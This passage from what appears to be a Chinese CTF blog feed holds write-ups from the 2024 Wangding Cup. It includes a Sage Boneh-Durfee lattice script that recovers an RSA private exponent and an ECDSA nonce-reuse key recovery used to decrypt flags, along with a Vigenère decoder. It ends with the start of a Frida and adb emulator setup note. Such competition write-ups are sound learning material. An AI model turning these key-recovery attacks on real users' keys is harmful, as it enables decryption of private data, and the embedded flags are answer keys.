log(bound)) / log(<span class="hljs-number">2</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))<br>        <span class="hljs-keyword">if</span> strict:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)<br><br>    <span class="hljs-comment"># display the lattice basis</span><br>    <span class="hljs-keyword">if</span> debug:<br>        matrix_overview(BB, modulus ^ mm)<br><br>    <span class="hljs-comment"># LLL</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)<br><br>    <span class="hljs-comment"># BB = BB.BKZ(block_size=25)</span><br>    BB = BB.LLL()<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL is done!&quot;</span>)<br><br>    <span class="hljs-comment"># æ›¿æ¢å‘é‡ i å’Œ j -&gt;å¤šé¡¹å¼ 1 å’Œ 2</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åœ¨æ ¼ä¸­å¯»æ‰¾çº¿æ€§æ— å…³å‘é‡&quot;</span>)<br>    found_polynomials = <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> pol1_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> pol2_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pol1_idx + <span class="hljs-number">1</span>, nn):<br><br>            <span class="hljs-comment"># å¯¹äºi and j, æ„é€ ä¸¤ä¸ªå¤šé¡¹å¼</span><br><br>            PR.&lt; w, z &gt;= PolynomialRing(ZZ)<br>            pol1 = pol2 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>                pol1 += monomials[jj](w * z + <span class="hljs-number">1</span>, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)<br>                pol2 += monomials[jj](w * z + <span class="hljs-number">1</span>, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)<br><br>            <span class="hljs-comment"># ç»“æœ</span><br>            PR.&lt; q &gt;= PolynomialRing(ZZ)<br>            rr = pol1.resultant(pol2)<br><br>            <span class="hljs-keyword">if</span> rr.is_zero() <span class="hljs-keyword">or</span> rr.monomials() == [<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="hljs-string">&quot;and&quot;</span>, pol2_idx)<br>                found_polynomials = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found_polynomials:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_polynomials:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    rr = rr(q, q)<br><br>    <span class="hljs-comment"># solutions</span><br>    soly = rr.roots()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(soly) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your prediction (delta) is too small&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    soly = soly[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    ss = pol1(q, soly)<br>    solx = ss.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> solx, soly<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">example</span>():<br>    <span class="hljs-comment">############################################</span><br>    <span class="hljs-comment"># éšæœºç”Ÿæˆæ•°æ®</span><br>    <span class="hljs-comment">##########################################</span><br>    <span class="hljs-comment"># start_time =time.perf_counter</span><br>    start = time.clock()<br>    size = <span class="hljs-number">512</span><br>    length_N = <span class="hljs-number">2</span> * size;<br>    ss = <span class="hljs-number">0</span><br>    s = <span class="hljs-number">70</span>;<br>    M = <span class="hljs-number">1</span>  <span class="hljs-comment"># the number of experiments</span><br>    delta = <span class="hljs-number">299</span> / <span class="hljs-number">1024</span><br>    <span class="hljs-comment"># p =  random_prime(2^512,2^511)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(M):<br>        <span class="hljs-comment">#         p =  random_prime(2^size,None,2^(size-1))</span><br>        <span class="hljs-comment">#         q =  random_prime(2^size,None,2^(size-1))</span><br>        <span class="hljs-comment">#         if(p&lt;q):</span><br>        <span class="hljs-comment">#             temp=p</span><br>        <span class="hljs-comment">#             p=q</span><br>        <span class="hljs-comment">#             q=temp</span><br>        N =<span class="hljs-number">107892573713246099817538936816485851035053538530228178586297516104462355899705036416845549988000543254717342505493461294554541098637839010844819316344397595836466293908827352240852019945855020602201742694540642287347823025883131162483705106324646432257707195307227627208850506071985510840207212074649893852289</span><br>        e =<span class="hljs-number">106026779355993573435326995058838659695563314723896436315704944869047461810171317853485834578907922477225219563648678852066399786593146779733369104463848604460901829459576565561299893410357693816050012889075185831684944657633027210516389798278082334754603104594287285628025433146548664548308055805258965566543</span><br>        c =<span class="hljs-number">74801258971353592087655273561994005413765184821038662179717923534370360999501931581907306714940348903440446458261785275314423770475637996343903355116249112854972152857616186571871846360852766323423533588570164035716759526288174656142706806500076294386681134096440267098094279442917447969106043371238327287569</span><br><br>        hint1 = <span class="hljs-number">895381917907042032873</span> <span class="hljs-comment"># pé«˜ä½</span><br>        hint2 = <span class="hljs-number">934258518638868635029</span> <span class="hljs-comment"># qé«˜ä½</span><br>        <span class="hljs-comment">#         print (&quot;pçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(p/2^(512-s)))</span><br>        <span class="hljs-comment">#         print (&quot;qçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(q/2^(512-s)))</span><br><br>        <span class="hljs-comment">#         N = p*q;</span><br><br>        <span class="hljs-comment"># è§£å¯†æŒ‡æ•°dçš„æŒ‡æ•°( æœ€å¤§0.292)</span><br><br>        m = <span class="hljs-number">7</span>  <span class="hljs-comment"># æ ¼å¤§å°ï¼ˆè¶Šå¤§è¶Šå¥½/è¶Šæ…¢ï¼‰</span><br>        t = <span class="hljs-built_in">round</span>(((<span class="hljs-number">1</span> - <span class="hljs-number">2</span> * delta) * m))  <span class="hljs-comment"># æ¥è‡ª Herrmann å’Œ May çš„ä¼˜åŒ–</span><br>        X = floor(N ^ delta)  <span class="hljs-comment">#</span><br>        Y = floor(N ^ (<span class="hljs-number">1</span> / <span class="hljs-number">2</span>) / <span class="hljs-number">2</span> ^ s)  <span class="hljs-comment"># å¦‚æœ pã€ q å¤§å°ç›¸åŒï¼Œåˆ™æ­£ç¡®</span><br>        <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(hint1), <span class="hljs-built_in">int</span>(hint1) + <span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n\n\n l=&#x27;</span>, l)<br>            pM = l;<br>            p0 = pM * <span class="hljs-number">2</span> ^ (size - s) + <span class="hljs-number">2</span> ^ (size - s) - <span class="hljs-number">1</span>;<br>            q0 = N / p0;<br>            qM = <span class="hljs-built_in">int</span>(q0 / <span class="hljs-number">2</span> ^ (size - s))<br>            A = N + <span class="hljs-number">1</span> - pM * <span class="hljs-number">2</span> ^ (size - s) - qM * <span class="hljs-number">2</span> ^ (size - s);<br>            <span class="hljs-comment"># A = N+1</span><br>            P.&lt; x, y &gt;= PolynomialRing(ZZ)<br>            pol = <span class="hljs-number">1</span> + x * (A + y)  <span class="hljs-comment"># æ„å»ºçš„æ–¹ç¨‹</span><br><br>            <span class="hljs-comment"># Checking bounds</span><br>            <span class="hljs-comment"># if debug:</span><br>            <span class="hljs-comment"># print (&quot;=== æ ¸å¯¹æ•°æ® ===&quot;)</span><br>            <span class="hljs-comment"># print (&quot;* delta:&quot;, delta)</span><br>            <span class="hljs-comment"># print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span><br>            <span class="hljs-comment"># print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # eçš„bitæ•°</span><br>            <span class="hljs-comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # Nçš„bitæ•°</span><br>            <span class="hljs-comment"># print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # Nçš„bitæ•°</span><br>            <span class="hljs-comment"># print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span><br><br>            <span class="hljs-comment"># boneh_durfee</span><br>            <span class="hljs-keyword">if</span> debug:<br>                <span class="hljs-comment">##print (&quot;=== running algorithm ===&quot;)</span><br>                start_time = time.time()<br><br>            solx, soly = boneh_durfee(pol, e, m, t, X, Y)<br><br>            <span class="hljs-keyword">if</span> solx &gt; <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># print (&quot;=== solution found ===&quot;)</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-literal">False</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x:&quot;</span>, solx)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;y:&quot;</span>, soly)<br><br>                d_sol = <span class="hljs-built_in">int</span>(pol(solx, soly) / e)<br>                ss = ss + <span class="hljs-number">1</span><br><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== solution found ===&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>, l)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;qçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>, qM)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>, d_sol)<br><br>            <span class="hljs-keyword">if</span> debug:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))<br>            <span class="hljs-comment"># break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ss=&quot;</span>, ss)<br>        <span class="hljs-comment"># end=time.process_time</span><br>        end = time.clock()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Running time: %s Seconds&#x27;</span> % (end - start))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    example()  <br></code></pre></td></tr></table></figure><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730192307831-6a8ea6b0-529a-4178-ba0d-7acc1d2e3ec8.png" class="" title="img"><p>è·‘å‡ºdåç›´æ¥è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">107892573713246099817538936816485851035053538530228178586297516104462355899705036416845549988000543254717342505493461294554541098637839010844819316344397595836466293908827352240852019945855020602201742694540642287347823025883131162483705106324646432257707195307227627208850506071985510840207212074649893852289</span><br>d = <span class="hljs-number">686044856631363471654750621230244587429581968036750428251137157884014229839209884769622191</span><br>c = <span class="hljs-number">74801258971353592087655273561994005413765184821038662179717923534370360999501931581907306714940348903440446458261785275314423770475637996343903355116249112854972152857616186571871846360852766323423533588570164035716759526288174656142706806500076294386681134096440267098094279442917447969106043371238327287569</span><br><br><br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#b&#x27;wdflag&#123;146f65bb-fc74-4b1e-b02b-13099e18b46b&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>ç»´å‰å°¼äºš+aes_cbcï¼Œaeså¯†é’¥æ˜¯ESDASç§é’¥dAçš„sha256</p><p>è¯¢é—®aiè§£aes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br><span class="hljs-comment"># å·²çŸ¥å‚æ•°</span><br>r1 = <span class="hljs-number">80932673752923845218731053671144903633094494351596082125742241568755353762809</span><br>r2 = <span class="hljs-number">80932673752923845218731053671144903633094494351596082125742241568755353762809</span><br>s1 = <span class="hljs-number">11239004842544045364097722042148768449026688243093666008376082303522447245154</span><br>s2 = <span class="hljs-number">97301123368608673469588981075767011435222146576812290449372049839046298462487</span><br>z1 = <span class="hljs-number">84483328065344511722319723339101492661376118616972408250436525496870397932079</span><br>z2 = <span class="hljs-number">114907157406602520059145833917511615616817014350278499032611638874752053304591</span><br>n = <span class="hljs-number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span><br><span class="hljs-comment"># è®¡ç®— k</span><br>num = (z1 * r2 - z2 * r1) % n<br>denom = (s1 * r2 - s2 * r1) % n<br><br><span class="hljs-comment"># æ±‚é€†å¹¶è®¡ç®— k</span><br><span class="hljs-keyword">if</span> denom != <span class="hljs-number">0</span>:<br>    k = (num * invert(denom, n)) % n<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Calculated k:&quot;</span>, k)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Denominator is zero; cannot calculate k.&quot;</span>)<br><span class="hljs-comment"># k = 66385432128793118118895060820925676692032302325334993911655704199910748028498  # éœ€è¦è®¡ç®—æˆ–å·²çŸ¥çš„ k</span><br><br><br><span class="hljs-comment"># è®¡ç®— dA</span><br>dA = (invert(r1, n) * (s1 * k - z1)) % n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Calculated dA:&quot;</span>, dA)<br><br><span class="hljs-comment"># ç”Ÿæˆ AES å¯†é’¥</span><br>key = sha256(long_to_bytes(dA)).digest()<br><br><span class="hljs-comment"># æå–åŠ å¯†æ ‡å¿—</span><br>encrypted_flag_hex = <span class="hljs-string">&quot;d8851c55edec1114a6d7a4d6d5efbba4611a39216ec146d2e675194dd0d5f768bee1b09799a133ffda1d283c4f6db475834cbe52c38c88736c94795c137490be&quot;</span><br>encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)<br><br><span class="hljs-comment"># æå– IV å’Œå¯†æ–‡</span><br>iv = encrypted_flag_bytes[:<span class="hljs-number">16</span>]<br>ciphertext = encrypted_flag_bytes[<span class="hljs-number">16</span>:]<br><br><span class="hljs-comment"># AES è§£å¯†</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size).decode()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag:&quot;</span>, decrypted_flag)<br></code></pre></td></tr></table></figure><p>æŠŠæ˜æ–‡æ”¹æˆå¯†æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">victory_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br><br>      key = key.upper()<br>      key_length = <span class="hljs-built_in">len</span>(key)<br>      decrypted_text = <span class="hljs-string">&#x27;&#x27;</span><br><br>      <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ciphertext):<br>                <span class="hljs-keyword">if</span> char.isalpha():<br>                          shift = <span class="hljs-built_in">ord</span>(key[i % key_length]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br>                          decrypted_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) - shift + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>                          decrypted_text += decrypted_char<br>                <span class="hljs-keyword">else</span>:<br>                      decrypted_text += char<br><br>      <span class="hljs-keyword">return</span> decrypted_text<br><br><span class="hljs-comment"># ç¤ºä¾‹ç”¨æ³•</span><br>victory_key = <span class="hljs-string">&quot;WANGDINGCUP&quot;</span><br>victory_encrypted_flag = <span class="hljs-string">&quot;SDSRDO&#123;27Z8ZEPLGJ040UQX2Q0GLOG70PZ0484L&#125;&quot;</span>     <span class="hljs-comment"># æ›¿æ¢ä¸ºæ‚¨çš„å¯†æ–‡</span><br>decrypted_flag = victory_decrypt(victory_encrypted_flag, victory_key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag:&quot;</span>, decrypted_flag)<br><br><span class="hljs-comment">#WDFLAG&#123;27F8DECFDB040ABB2D0DDBA70AD0484D&#125;</span><br></code></pre></td></tr></table></figure><p>æœ€åæŠŠå¤§å†™å­—æ¯æ”¹å†™æˆå°å†™</p><p>åœ¨çº¿è§£å¯†å¥½åƒä¸å¯¹</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730256507353-ad738b44-e10c-4cad-8d39-a6e045826a75.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sm4</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fridaå­¦ä¹ è®°å½•</title>
    <link href="/2024/10/28/frida/"/>
    <url>/2024/10/28/frida/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.kanxue.com/thread-280758.htm">https://bbs.kanxue.com/thread-280758.htm</a></p><p><a href="https://bbs.kanxue.com/thread-280812.htm#msg_header_h2_1">https://bbs.kanxue.com/thread-280812.htm#msg_header_h2_1</a></p><h1 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h1><p>æ ¹æ®æŒ‡ä»¤é›†çš„ä¸åŒåˆ†ä¸ºCISCï¼ˆå¤æ‚æŒ‡ä»¤é›†ï¼‰å’ŒRISCï¼ˆç²¾ç®€æŒ‡ä»¤é›†ï¼‰ï¼ŒX86æ˜¯CISCçš„ä»£è¡¨ï¼Œè€ŒARMåˆ™æ˜¯RISCçš„ä»£è¡¨</p><p>ç§»åŠ¨è®¾å¤‡ï¼ˆæ‰‹æœºï¼Œå¹³æ¿ï¼‰æ›´å¤šé‡‡ç”¨armæ¶æ„ï¼Œè€Œç”µè„‘æ›´å¤šé‡‡ç”¨x86ç³»åˆ—æ¶æ„</p><h1 id="ç”µè„‘æ¨¡æ‹Ÿå™¨"><a href="#ç”µè„‘æ¨¡æ‹Ÿå™¨" class="headerlink" title="ç”µè„‘æ¨¡æ‹Ÿå™¨"></a>ç”µè„‘æ¨¡æ‹Ÿå™¨</h1><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p><a href="https://blog.csdn.net/Ruaki/article/details/135580772">https://blog.csdn.net/Ruaki/article/details/135580772</a></p><p>å…ˆå®‰è£…magiskï¼Œè¿™é‡ŒæŠŠæ¨¡æ‹Ÿæ‰‹æœºå‹å·ä»PCLM10æ”¹ä¸ºPCLM9å‘ç°å°±æœ‰ç›´æ¥å®‰è£…é€‰é¡¹äº†</p><img src="/2024/10/28/frida/1712195710911-7cc5b222-a9ad-46b8-a495-1ade9517b74e.png" class="" title="img"><p><a href="https://www.bilibili.com/video/BV1wT411N7sV/">https://www.bilibili.com/video/BV1wT411N7sV/</a></p><p>å®‰è£…MagiskHidePropsConfigæ¨¡å—</p><p>å…±äº«æ–‡ä»¶å¤¹åœ¨Pictureç›®å½•</p><img src="/2024/10/28/frida/1712197854265-dc18c36d-16dd-46b9-8d2e-762c772f2d49.png" class="" title="img"><img src="/2024/10/28/frida/1712197153960-64efa81f-26a4-4836-8e0e-6d92bcf579f1.png" class="" title="img"><p>é—®ä½ æ˜¯å¦æ‰§è¡Œæƒé™æœ‰10ç§’æ—¶é—´ï¼Œæ¥ä¸åŠçš„æ—¶å€™å¯ä»¥å¸è½½é‡è£…</p><h2 id="è¿æ¥è®¾å¤‡"><a href="#è¿æ¥è®¾å¤‡" class="headerlink" title="è¿æ¥è®¾å¤‡"></a>è¿æ¥è®¾å¤‡</h2><p>æœ¬åœ°ç¯å¢ƒï¼šé›·ç”µæ¨¡æ‹Ÿå™¨Android9 x64ï¼Œå¤œç¥æ¨¡æ‹Ÿå™¨Android7 x86</p><p><a href="https://blog.csdn.net/kxltsuperr/article/details/133838337">https://blog.csdn.net/kxltsuperr/article/details/133838337</a></p><p><a href="https://blog.csdn.net/weixin_45541986/article/details/128319312">https://blog.csdn.net/weixin_45541986/article/details/128319312</a></p><p>10061è¯´æ˜æ¨¡æ‹Ÿå™¨æ²¡å¼€<img src="/2024/10/28/frida/1710164574208-18b8d166-51bd-4a69-8039-6abde13ddbb9-17472252033004.png" class="" title="img"></p><p>å…ˆå¯åŠ¨æ¨¡æ‹Ÿå™¨é‡Œçš„åº”ç”¨</p><p> é›·ç”µæ¨¡æ‹Ÿå™¨ï¼š<code>adb connect 127.0.0.1:5555</code></p><p>å¤œç¥æ¨¡æ‹Ÿå™¨ï¼š<code>adb connect 127.0.0.1:62001</code>ï¼ˆåªè®©è¿32ä½ï¼‰</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">adb devices`ï¼Œè‹¥æœ‰å¤šä¸ªè®¾å¤‡`adb.exe kill-server<br></code></pre></td></tr></table></figure><p>è·å¾—rootæƒé™<code>adb root</code>(å¤±è´¥çš„æ—¶å€™å¤šè¯•å‡ æ¬¡ï¼‰</p><p>è¿æ¥åˆ°è¿œç¨‹<code>adb shell</code>ï¼Œè¿›å…¥fsç›®å½•<code>cd /data/local/tmp</code>ï¼Œ<code>./fs</code>æ‰§è¡Œ</p><p>æŸ¥çœ‹æ¶æ„ï¼šadb shell getprop ro.product.cpu.abi</p><ul><li><code>127.0.0.1:5555</code> æ˜¯æ¨¡æ‹Ÿå™¨çš„ç½‘ç»œåœ°å€å’Œç«¯å£å·</li><li><code>emulator-5554</code> æ˜¯æ¨¡æ‹Ÿå™¨çš„è®¾å¤‡åç§°</li></ul><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:5555</span>` å¯¹åº” `emulator-<span class="hljs-number">5554</span><br></code></pre></td></tr></table></figure><img src="/2024/10/28/frida/1708861679292-3ee1c9d0-731b-464e-a8d6-f4247e2905fd-17472252033016.png" class="" title="img"><p>å…ˆpushï¼Œå†å»å¯¹åº”è·¯å¾„</p><img src="/2024/10/28/frida/1708862204362-fba47b0f-f174-470b-82fd-9c0d093265e0-17472252033018.png" class="" title="img"><p>ä¹Ÿå¯ä»¥ç”¨å…±äº«æ–‡ä»¶å¤¹ä¼ frida-server</p><img src="/2024/10/28/frida/1709106544067-2c326341-66b0-4547-b840-739326b8bf13-174722520330110.png" class="" title="img"><img src="/2024/10/28/frida/1709106683481-91eac644-f9c3-42ca-8c97-4743ccb31f01-174722520330112.png" class="" title="img"><h2 id="ç»éªŒæ€»ç»“"><a href="#ç»éªŒæ€»ç»“" class="headerlink" title="ç»éªŒæ€»ç»“"></a>ç»éªŒæ€»ç»“</h2><p>æ‰“å¼€çš„æ–¹å¼å®‰è£…ä¸äº†å¯ä»¥æ‹–åŠ¨æˆ–è€…adb install</p><p>å¯é€šè¿‡ä¸‹é¢è·¯å¾„æŸ¥æ‰¾æ—¥å¿—</p><img src="/2024/10/28/frida/1724498694497-65c56f55-0eb0-4307-baad-0e425d2a4bde-174722520330114.png" class="" title="img"><p>å¤„äºå¼€å‘è€…æ¨¡å¼ä¸€ç›´æœªè¢«è°ƒè¯•</p><img src="/2024/10/28/frida/1730102274627-e809a6dc-e147-4ccd-bd70-13d6eda9b9c1-174722520330116.png" class="" title="img"><p>å¯ä»¥å…³é—­å¼€å‘è€…æ¨¡å¼</p><img src="/2024/10/28/frida/1730102659189-864d3663-4d42-4afc-8ae7-048946e21b15-174722520330118.png" class="" title="img"><p>æˆ‘çš„é›·ç”µæ¨¡æ‹Ÿå™¨è™½ç„¶å¯ä»¥å®‰è£…Android9ï¼Œä½†æ˜¯æ— æ³•adb shellï¼Œå› ä¸ºæ‰¾ä¸åˆ°Androidè·¯å¾„</p><img src="/2024/10/28/frida/1730102502794-a16bc096-091e-4fa4-8d25-8deae8d871c8-174722520330120.png" class="" title="img"><h1 id="æ‰‹æœºçœŸæœº"><a href="#æ‰‹æœºçœŸæœº" class="headerlink" title="æ‰‹æœºçœŸæœº"></a>æ‰‹æœºçœŸæœº</h1><h2 id="è¿æ¥è®¾å¤‡-1"><a href="#è¿æ¥è®¾å¤‡-1" class="headerlink" title="è¿æ¥è®¾å¤‡"></a>è¿æ¥è®¾å¤‡</h2><p>æ•°æ®çº¿è¿æ¥ä¹‹åæ‰‹æœºå¼€å¯å¼€å‘è€…æ¨¡å¼ä¸­çš„å…è®¸usbè°ƒè¯•</p><img src="/2024/10/28/frida/1744369836522-36a2ab16-f50b-4c5c-8d34-ec36f01787a6.png" class="" title="img"><h1 id="frida-hook"><a href="#frida-hook" class="headerlink" title="frida hook"></a>frida hook</h1><p><a href="https://www.cnblogs.com/lxh2cwl/p/14842544.html">https://www.cnblogs.com/lxh2cwl/p/14842544.html</a></p><p>&#x2F;data&#x2F;local&#x2F;tmpç›®å½•ä¸‹å¯åŠ¨frida-serverï¼Œå¿…é¡»è¦æœ‰rootæƒé™ï¼š<code>./fs</code></p><img src="/2024/10/28/frida/1719835391861-c09cb64a-798d-48fa-9ff2-bd4484900fed-174722520330123.png" class="" title="img"><p>è¿›è¡Œç«¯å£è½¬å‘ç›‘å¬ï¼š<code>adb forward tcp:27042 tcp:27042</code></p><p>æœç´¢ç‰¹å®šè¿›ç¨‹ï¼š<code>frida-ps -U</code> | grep -i settings</p><p>æŸ¥çœ‹è¿›ç¨‹çœŸæ­£åŒ…åï¼š<code>frida-ps -U -a</code></p><p>è¾“å…¥ç©ºæ ¼é”®ä¼šæœ‰æç¤ºä¸è¡¥å…¨ </p><h2 id="é™æ€"><a href="#é™æ€" 